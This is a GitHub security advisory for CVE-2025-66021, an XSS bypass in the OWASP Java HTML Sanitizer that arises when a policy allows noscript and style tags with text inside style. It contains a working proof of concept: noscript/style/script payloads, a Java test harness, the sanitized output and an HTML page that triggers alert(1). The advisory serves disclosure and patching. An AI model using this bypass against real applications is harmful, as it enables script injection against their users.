# [H] OWASP Java HTML Sanitizer is vulnerable to XSS via noscript tag and improper style tag sanitization 

## Summary
Severity: High
Advisory: GHSA-g9gq-3pfx-2gw2
CVE: CVE-2025-66021
CWE: CWE-79
Ecosystem: Maven
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-11-25
Source: https://github.com/advisories/GHSA-g9gq-3pfx-2gw2
Type: github-advisory

## Affected
- Maven: `com.googlecode.owasp-java-html-sanitizer:owasp-java-html-sanitizer` — affected >=20240325.1 <20260101.1

## Details
### Summary
It is observed that OWASP java html sanitizer is vulnerable to XSS if HtmlPolicyBuilder allows `noscript` and `style` tags with `allowTextIn` inside the style tag. This could lead to XSS if the payload is crafted in such a way that it does not sanitise the CSS and allows tags which is not mentioned in HTML policy. 

### Details

The OWASP java HTML sanitizer is vulnerable to XSS. This only happens when HtmlPolicyBuilder allows `noscript` & `style` tag with `allowTextIn` inside style tags.

The following condition is very edge case but if users combine a HtmlPolicyBuilder with any other tags except `noscript` and allow `style` tag with `allowTextIn` inside the style tag then In this case sanitizer would be safe from XSS. This happens because how the browser also perceives `noscript` tags post sanitization. 

### PoC

1.  Lets create a `HtmlPolicyBuilder` which allows `p, noscript, style` html tags and allows `.allowTextIn("style")`.
2.  There are two XSS payloads which very identical and only difference is one has p tag and other has noscript tag.
These payload have script tags that could be vulnerable to XSS and should be stripped out after sanitisation.

```HTML
1. <noscript><style></noscript><script>alert(1)</script>
2. <p><style></p><script>alert(1)</script>
```

3. Run the following piece of code which sanitizes the payload. 

```java
public class main {
	private static final String ALLOWED_HTML_TAGS = "p, noscript, style";

	/**
	 * Description of vulnerability :
	 *  The OWASP Sanitizer sanitize the user inputs w.r.t to defined whitelisted HTML tags.
	 *  However, if script tags is not allowed in the HTML element policy yet it can lead to XSS in edge cases.
	 */

	public static void main(String[] args) {
		withAllowedTextAndStyleTag();
	}

	/**
	 *  Test case : Vulnerable to XSS
	 */
	public static void withAllowedTextAndStyleTag() {
		HtmlPolicyBuilder htmlPolicyBuilder = new HtmlPolicyBuilder();
		PolicyFactory policy = htmlPolicyBuilder
				.allowElements(ALLOWED_HTML_TAGS.split("\\s*,\\s*"))
				.allowTextIn("style")
				.toFactory();
		String untrustedHTMLOne = "<noscript><style></noscript><script>alert(1)</script>";
		String untrustedHTMLTwo = "<p><style></p><script>alert(1)</script>";

		System.out.println("PAYLOAD: " + untrustedHTMLOne +"\nSANITIZED OUTPUT: " + policy.sanitize(untrustedHTMLOne));
		System.out.println("PAYLOAD: " + untrustedHTMLTwo +"\nSANITIZED OUTPUT: " + policy.sanitize(untrustedHTMLTwo));
	}
}
```

Use the latest library version 

```xml
		<dependency>
			<groupId>com.googlecode.owasp-java-html-sanitizer</groupId>
			<artifactId>owasp-java-html-sanitizer</artifactId>
			<version>20240325.1</version>
		</dependency>
```

4. Output of the POC code should look like this 

```HTML

PAYLOAD: <noscript><style></noscript><script>alert(1)</script>
SANITIZED OUTPUT: <noscript><style></noscript><script>alert(1)</script></style></noscript>


PAYLOAD: <p><style></p><script>alert(1)</script>
SANITIZED OUTPUT: <p><style></p><script>alert(1)</script></style></p>

```

5. Lets understand what happened in sanitization process below 

```txt
--------------------------| --> anything after style tag is cosidered as CSS and not sanitized 
PAYLOAD: <noscript><style> {</noscript><script>alert(1)</script>} -> CSS

-----------------------------------| --> after sanitization, payload in script tag remained same and style and noscript tags is closed. 
SANITIZED OUTPUT: <noscript><style>{</noscript><script>alert(1)</script>}</style></noscript>

-------------------| --> anything after style tag is cosidered as CSS and not sanitized 
PAYLOAD: <p><style></p>{<script>alert(1)</script>} -> CSS

--------------------------- | --> after sanitization payload in script tag remained same and style and p tags is closed. 
SANITIZED OUTPUT: <p><style>{</p><script>alert(1)</script>}</style></p>

```

6. Lets create a sample html page and copy both sanitized output which should be generated in step 5 

```HTML

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>POC OF SANITIZER OUTPUT</title>
</head>
<body>

<!--XSS OUTPUT : <noscript><style></noscript><script>alert(1)</script></style></noscript>-->
<noscript><style></noscript><script>alert(1)</script></style></noscript>

<!-- SAFE OUTPUT -->
<p><style></p><script>alert(1)</script></style></p>

</body>
</html>
```



7. Open this HTML page in the browser it should pop an alert.

![Alt text](https://github.com/user-attachments/assets/0b96a6c2-818e-4a21-80df-42c4cf26bafd "Leads to XSS")

8. Open inspect element to understand what happened. If users look closely a payload combined with p tag and style tag did not cause XSS and browser percived anything after style tag as CSS. 

![SAFE from XSS](https://github.com/user-attachments/assets/b6c657fc-32df-4006-9ee8-ca6598f094ad "Safe from XSS")

9. The payload which combined with noscript tag and style tag did caused XSS.
The broswer perceived noscript and which wrapped `style` tag then closed noscript tag and after that script payload is considered as valid HTML tag and it executed in browser and this leads to XSS because this is very different then what happened in the last example with p tag.

![XSS POC](https://github.com/user-attachments/assets/abfe0112-c63e-4149-a343-509b25db1b60 "Leads to XSS")


### Impact
1. This potentially could leads to XSS in applications. 
Ref : https://owasp.org/www-community/attacks/xss/

## References
- https://github.com/OWASP/java-html-sanitizer/security/advisories/GHSA-g9gq-3pfx-2gw2
- https://nvd.nist.gov/vuln/detail/CVE-2025-66021
- https://github.com/OWASP/java-html-sanitizer/issues/363
- https://github.com/OWASP/java-html-sanitizer/commit/4149cf02ba84db13e8e9d7ee1b01b3f47238e072
- https://github.com/OWASP/java-html-sanitizer/commit/b98cdf1cd5e156a6259b01aa8cdc7372c6efde1e
- https://github.com/OWASP/java-html-sanitizer/commit/d6e0463ed3b48777ecd187913ffdbe767508ff45
- https://github.com/OWASP/java-html-sanitizer
